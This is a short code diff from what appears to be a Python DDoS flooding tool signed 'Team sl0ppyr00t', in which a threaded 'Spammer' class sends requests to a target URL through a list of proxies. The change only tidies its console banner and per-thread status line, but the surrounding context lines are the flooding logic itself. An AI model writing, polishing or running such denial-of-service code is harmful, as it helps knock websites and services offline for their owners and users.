@@ -8251,12 +8251,16 @@ class Spammer(threading.Thread):
         urllib.request.install_opener(opener)
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "DDos, By Team sl0ppyr00t!!")
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.WHITE + "")
-        sys.stdout.write("Thread #%4d | %4d\%d | Proxy@%s" % (self.num, N, len(self.lista), self.lista[N]))
 
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Fore.YELLOW + "DDoS, By Team sl0ppyr00t!!")
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Style.RESET_ALL, end="")
+
+        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
+        sys.stdout.flush()
+        sys.stdout.write("\r")
+	    
     def run(self):
         global N
         self.Lock.acquire()
